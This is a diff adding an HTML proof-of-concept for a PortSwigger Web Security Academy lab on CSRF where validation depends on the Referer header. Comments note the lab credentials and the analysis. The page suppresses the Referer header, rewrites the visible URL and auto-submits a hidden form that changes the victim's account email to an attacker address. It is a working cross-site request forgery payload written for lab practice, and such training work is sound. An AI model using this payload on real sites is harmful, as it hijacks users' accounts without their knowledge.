@@ -1,0 +1,36 @@
+<html>
+        <!--
+            Lab #7 - CSRF where validation depends on header being present
+
+            Vulnerable parametr - email change functionality
+
+            Goal - exploit CSRF to change email address
+
+            Creds - wiener:peter
+
+            Analysis:
+
+            In order for a CSRF attack to be possible:
+            - A relevant action: change a users email
+            - Cookie-based session handlinf: session cookie
+            - No unpredictable request parameter: no csrf token
+
+            Testing Referer header for CSRF attacks:
+            1. Remove the Referer header
+        -->
+        <head>
+            <meta name="referrer" content="never">
+        </head>
+        <body>
+        <script>history.pushState('', '', '/')</script>
+        <form action="acff1fbc1f6336e0c0d3091700fd0016.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="sarlot@hacker.com"/>
+            <input type="submit" value="Submit request"/>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
